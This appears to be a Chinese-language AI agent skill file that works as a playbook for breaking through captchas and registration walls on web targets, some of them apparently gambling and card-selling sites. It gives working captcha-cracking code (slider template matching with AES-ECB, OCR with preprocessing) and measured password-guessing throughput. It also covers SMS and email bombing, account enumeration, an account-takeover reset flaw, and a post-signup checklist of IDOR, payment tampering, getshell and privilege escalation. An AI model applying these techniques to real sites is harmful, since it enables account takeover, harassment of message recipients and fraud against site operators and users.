---
name: captcha-registration-bypass
description: "验证码/注册关突破工具箱。触发: 验证码, 注册, 滑块, 收信, 注册关, 邮箱验证码, 短信验证码。"
tags: [verify/reset, 信任错位]
---

# 验证码/注册关突破工具箱(Captcha & Registration Wall Bypass)

针对"目标被验证码/注册流程挡住"的 Web 目标。这是**所有 SaaS/商城/发卡站的第一道墙**——登录/注册/短信接口前的人机验证 + 邮箱/手机验证码 + 锁定机制。核心: 识别验证码类型 → 用对应方案突破 → 拿到注册/登录通道。

## 0. 总决策树(先看这个)

```
遇到验证码/注册关
  ├─ 滑块(向右滑动/拼图) → 1. AJ-Captcha 模板匹配破解
  ├─ 图形验证码(PNG 字母数字) → 2. ddddocr 本地识别
  ├─ Altcha PoW(checkbox + 后台暴力) → 3. 浏览器 worker 自动求解
  ├─ Turnstile/geetest/recaptcha → 4. 服务端真校验 → 换注册路径(OAuth/OTP)
  ├─ 邮箱验证码 → 5. 频率限制/purpose 参数绕过 + 6. 临时邮箱收信
  └─ 短信验证码 → 7. verification 接口逆向(冷却/枚举/轰炸)
```

**关键认知**: 验证码破解 ≠ 目的,注册关突破才是。很多站点验证码是"真校验"(Turnstile/geetest 服务端验证),**死磕验证码浪费时间**——直接找替代注册路径(OAuth 登录自动建号、手机号 OTP 自动注册、分享链接 token 泄露)更快。先花 5 分钟确认验证码是不是服务端真校验,再决定投入方向。

## 1. AJ-Captcha 滑块破解(FastAdmin/EasyAdmin 系,已实测 100%)

### 识别
登录页引入 `verify.js` + `aj-captcha/js/aes.js`(crypto-js),文案"向右滑动完成验证"。

### 接口
```
POST /adminlogin/index/getCaptcha    body: captchaType=blockPuzzle|clickWord
  → {"repData": {"originalImageBase64": 背景图, "jigsawImageBase64": 滑块图,
     "secretKey": AES密钥, "token": UUID}}
POST /adminlogin/index/checkCaptcha  body: captchaType + pointJson + token + clientUid + ts
```
缺 `captchaType` 参数时返回 `"captchaType参数不正确！"`。

### 破解三步(全部实测通过)
1. **缺口识别**: 背景图(310x155)+ 滑块图(46x46,含透明区)→ numpy 模板匹配
   - 先取滑块图 alpha>100 的有效区域,再去掉阴影(alpha>200 核心区)
   - 全图滑动(步进1)算 `np.abs(roi - jigsaw)[mask].mean()` 最小 score → x
   - 要精确: 只算滑块核心区像素,候选 top3 逐个试
2. **AES 加密 pointJson(关键坑)**: 前端 aes.js = **CryptoJS AES + mode:ECB + Pkcs7**
   ```python
   AES.new(key.encode(), AES.MODE_ECB).encrypt(pad(json.dumps({"x":x,"y":5.0}).encode(), 16)) → base64
   ```
   - 用 CBC 报"请检查密钥是否正确！";改 ECB 后报"验证失败！" = 加密对了只是 x 偏
3. **checkCaptcha 提交**: `captchaType=blockPuzzle&pointJson=<urlencode(aes)>&token=<token>&clientUid=test&ts=<ms>` → `repCode=0000` 通过

### 完整登录链(FastAdmin)
- 登录 = **滑块 + 图形验证码双验证**(滑块通过后仍需 `code` 字段)
- 图形验证码: `GET /adminlogin/captcha`(PNG)→ ddddocr;错误消息泄露类型("验证码必须是数字" = 纯数字可爆)
- **登录失败锁定**: 文案"please try again after 1 day" = 失败锁 1 天;爆破前先测是否已锁

### 实战坑(咖租机 suishouzj 案例)
- 有时验证码校验**只检查格式不检查内容**——先试 `code=1234` 任意 4 位数字,可能直接过(比破解滑块快 100 倍)
- 发码接口 `verification` 可能无冷却 = 短信轰炸 + 账号枚举(存在/禁用/不存在响应差异)
- 锁定 DoS: 10 次密码错误锁 1 天,任何人均可触发锁定合法账号(可用作阻断,也可被对手利用)

## 2. 图形验证码 ddddocr 识别

```bash
pip install ddddocr
```
```python
import ddddocr
ocr = ddddocr.DdddOcr(show_ad=False)
code = ocr.classification(img_bytes)  # 纯数字/字母
```
- ★★ **修正(2026-09-15 实测推翻旧结论)**: 旧版本写"字母数字混合识别率 ~10% 不可靠"是**错的**——那是**没做预处理**的结果。**6-8x LANCZOS 放大 + `set_ranges("0-9a-z")` 限制字符集**后,字母数字混合验证码可稳定识别。实测(K11 qwsk11):不加预处理读 `btnw8v` 得 `btu8v`(错2字符);6x 放大后 raw/gray/蓝通道分离**全部读对**。
- 先提交一次错误码,看错误消息是否泄露类型("必须是数字"/"格式不正确")
- 验证码 URL 常见: `/captcha` `/captcha/get` `/code` `/verifycode`

### 2.1 标准预处理管道(可复用,已实测)
```python
from PIL import Image; import io, ddddocr
im = Image.open(p).convert("RGB")
im = im.resize((im.width*6, im.height*6), Image.LANCZOS)   # ★6x 是关键
o = io.BytesIO(); im.save(o, "PNG")
ocr = ddddocr.DdddOcr(show_ad=False)
try: ocr.set_ranges("0123456789abcdefghijklmnopqrstuvwxyz")  # ★收窄字符集
except Exception: pass
code = ocr.classification(o.getvalue())   # ~0.02s/张
```
噪声点重的验证码再加**蓝通道分离**(字符深蓝 R低B高、噪点浅蓝三通道都高):
```python
a = np.array(im).astype(int)
mask = (a[:,:,2]-a[:,:,0] > 60) & (a[:,:,2] < 220)
im = Image.fromarray(np.where(mask, 0, 255).astype('uint8'))
```

### 2.2 ★一次性验证码的定量结论(决定吞吐上限,实测 qwsk11)
| 问题 | 实测结论 |
|---|---|
| 顺序复用同一验证码? | **不可**。#1 提交通过(#1 响应=账号错误),#2/#3/#4 全部"验证码输入错误" |
| 并发竞态(同一码 60 并发)? | **竞态存在但不放大**。60 并发仅 **1 个**通过闸,其余拒绝+1 个空响应 |
| ⇒ 吞吐模型 | **有效口令测试率 = OCR通过率 × 请求速率**。不是"1码=N次" |
| ⇒ 正确策略 | **单发校验失败(&#34;验证码输入错误&#34;)就换新码重试,直到该口令真正被测到**——这样每条日志都是真测试,不会被 OCR 误差稀释 |
| 实测速率 | 源站直连 + 12 线程 ⇒ **8.9 有效口令测试/秒**(1349 条真测试/152s),OCR 单发通过率 19/29≈65% |

**判定 OCR 是否对的免费 oracle**:提交后看返回——`验证码输入错误`=OCR错/`账号或者密码错误`(或其它业务错)=**OCR对,口令已真测**。用这个自校验,别自己写 OCR 置信度。

## 3. Altcha PoW 破解(dujiaoshou 系,已实测)

### 识别
`GET /xxx/altcha/challenge` 返回 PBKDF2/SHA-256 + nonce + salt + cost + keyPrefix;前端有 `altcha-widget` 组件。

### 关键认知
- **solution 的 signature 是原样回显服务端 signature,不是自己算的**
- **PoW 模式纯 Python 不可能**(2^128);必须用浏览器前端 worker 自动求解
- 用 CDP 打开登录页 → **必须真实鼠标事件点击 checkbox**(JS setter+dispatchEvent 不触发 Vue 监听):
  ```python
  await ws.send({"method": "Input.dispatchMouseEvent", "params": {"type": "mousePressed", "x": cx, "y": cy, "button": "left", "clickCount": 1}})
  ```
- 等待 60-90 秒(前端 blob worker 并发暴力),轮询 `input[name=altcha]` 非空即成功

## 4. Turnstile/geetest/recaptcha(服务端真校验)

- 先花 1 次请求确认是否服务端真校验(伪造 token 提交看返回)
- **真校验 → 不要死磕**。换路径:
  - Google OAuth / GitHub OAuth 登录(自动建号,免验证码)
  - 手机号 OTP 登录(自动注册)
  - 分享/邀请链接(免登录,可能泄露 token: `localStorage.share_sessions_v1.tokens`)
  - 上游/管理端接口(admin 子域常无 Turnstile)
- geetest 历史漏洞: 某些站任意值可过(见 wps-casino-platform-pentest)

## 5. 邮箱验证码绕过

### 频率/参数漏洞(已实测 qavlixor)
- `/api/email-verification/send` **无频率限制** = 无限发信轰炸
- `purpose` 参数: 注册/找回密码/改邮箱共用接口时,校验可能只对特定 purpose 生效
- 验证码与邮箱强绑定(不能跨邮箱复用)、试错锁定(5 次即"错误次数过多")→ 爆破不可行
- **重置密码 token 不可爆破** → 找"验证码可回显/可预测/共享"的旁路

### 临时邮箱收信(全局瓶颈解法)
```python
# mail.tm API(免费,无需注册,HTTP 收信)
import requests, json
# 1. GET https://api.mail.tm/domains → 拿可用域名
# 2. POST /accounts 创建账号 {address, password}
# 3. POST /token {address, password} → Bearer token
# 4. GET /messages → 最新邮件,找验证码
# 5. GET /messages/{id} → 邮件正文(验证码在 HTML/文本里)
```
- 备选: mailsac.com(部分免费)、mail.tm 免费无限域名
- **用法**: 新目标卡注册关 → 用临时邮箱注册 → 进入业务流 → 测 IDOR/金额篡改/提现逻辑。这比死磕验证码破解快得多,且 100% 可复用。

## 6. 短信验证码接口逆向

- 发码接口常无冷却: 短信轰炸 + 账号枚举(存在/禁用/不存在响应差异)
- 验证码可能只验证格式(与登录验证码同病)
- 手机号格式: 国内 1[3-9]\d{9},接口可能只查后 4 位(尾号泄露)

### 6.1 ★免票发码的参数陷阱(实测 xwallet 2026-09)
注册页要调的发码接口,常被放在**匿名白名单**里(否则未登录用户无法注册)。直接用它,不需要任何会话:
```
POST /zf/xcoinApi/apiXCoinSendSmsCode  (匿名 200)
{"businessType":"register","smsType":"otp","areaCode":"0091","phone":"<10位>"}
→ {"success":true,"msg":"success","data":{"code":0,"smsId":"<雪花ID>","sign":"..."}}
```
★ **参数类型陷阱**: `businessType`/`smsType` 必须是**字符串枚举**。传数字 `1`/`2` 直接被拒 → `{"msg":"unknown sms business type"}`,极易误判为"接口不存在"。拿到 `smsId` 才算真受理。

### 6.2 ★公开接码站读取契约(拿码的正解)
公开接码站(如 sms24.me)的收件箱**HTML 里没有消息正文**,消息由 JS 拉取。**不要抓 HTML,直接找 API**:
```
# 定位: 抓收件箱页 HTML,找 data-endpoint 属性 → 再抓 app bundle JS 搜 fetch 契约
# sms24.me 权威契约(从 app-*.js 的 loadNumberMessages 读出):
POST https://sms24.me/api/messages/91<10位号>
Headers: Accept: application/json; Content-Type: application/json
Body: {"page":1,"locale":"en"}
→ {"messages":[{"from":"PayPal","content":"...code is 424526","created":"..."}],"page":1,"pages":N}
```
★ **必须 POST**: 用 GET 会被框架 catch-all 路由成同长度 HTML 页面(伪装成"页面正常"),看着像没消息。
★ 页面上的 "Rewarded / 看广告" 门只是 UI 计时器,**不拦 API**。

### 6.3 ★★投递判据(决定"是打法错还是路死")
发码返回 `success:true` **只代表服务端受理,不代表真投递**。判定方法(必须做对照):
1. 发码后轮询收件箱 3-5 分钟;同时看**同号是否收到其他平台的码**(PayPal/Google/Instagram)。
2. 同号能收到其他平台 ⇒ **号段可用、链路通** ⇒ 收不到目标平台的码 = **目标侧不投递**(平台把接码平台号段拉黑 / 未配置短信通道)。
3. ⇒ **此时注册链判死,别再换号硬试**;转 ①等限流解除 ②OAuth/TMA initData 等无密码入口 ③别的资产面。
★ 反向教训: 案卷里"短信已投递"的截图若只是 `Verifying your browser...` 挑战页,**那是推断不是证据**——复核时必须打开图看内容。

### 6.4 ★登录限流: 计时器会被重置(血泪)
账号级限流(如 "please try again after 24 hours")会**因每次尝试而重置倒计时**:`agent21` 11h→(试1次)→10h;`testuser1` 11h→(8次重登)→24h。
⇒ **铁律**: 限流生效后**绝不再碰**登录接口;脚本必须先读 cookie jar 复用会话,**只在 jar 缺失时登录一次并立即存盘**。别用"试一下有没有解锁"来浪费配额。

## 7. 注册关突破后立即做的事

```
注册成功(拿到账号/token)后,优先:
  1. 保 token: <REDACTED> Bearer,Session cookie
  2. 测 IDOR: /users/me/orders?user_id=1、/account/{id}
  3. 测支付链: 充值/提现/订单金额篡改(负数、0 元、重复回调)
  4. 测上传: 头像/文件 → 路径穿越 → getshell
  5. 提权: X-Impersonate-User-ID / X-Forwarded-User / tenant header
```

## 相关
- 前端 RSA 加密登录 / Altcha 详情: 见 frontend-auth-bypass
- Next.js SaaS 批量复用: 见 saas-batch-reuse
- 报告交付: 见 pentest-report-autogen

## 实战案例索引
- 咖租机 suishouzj: AJ-Captcha 模板匹配 100% + 验证码仅查格式任意 4 位可过 + verification 无冷却短信轰炸 + 10 次锁 1 天(报告 D:\博彩通杀\research\咖租机suishouzj_渗透测试报告_20260815.md)
- dujiaoshou: Altcha PoW 浏览器自动求解 + 分享链接 token 泄露
- qavlixor: 邮箱验证码 5 次锁定 + purpose 参数校验 + email-verification/send 无频率限制
- 必发系 518979.top: ddddocr 识别正确、admin/admin 已排除、剩 4 次机会(锁定计数)

## 短信重置三步信任错位（2026-10 M17500）
- 重置密码流程拆成 verify / reset 两步：verify 只校验 code 所属手机号，reset 只校验 `username` → 拿自己号的 code 重置别人账号
- 探法：先用自己的号走 verify 拿 step token，再把 body 里 `phone` 换目标、`username` 换目标
- 判据：reset 响应不回显手机号 = 服务端没做绑关系校验；成功回 200 且登录有效即成立
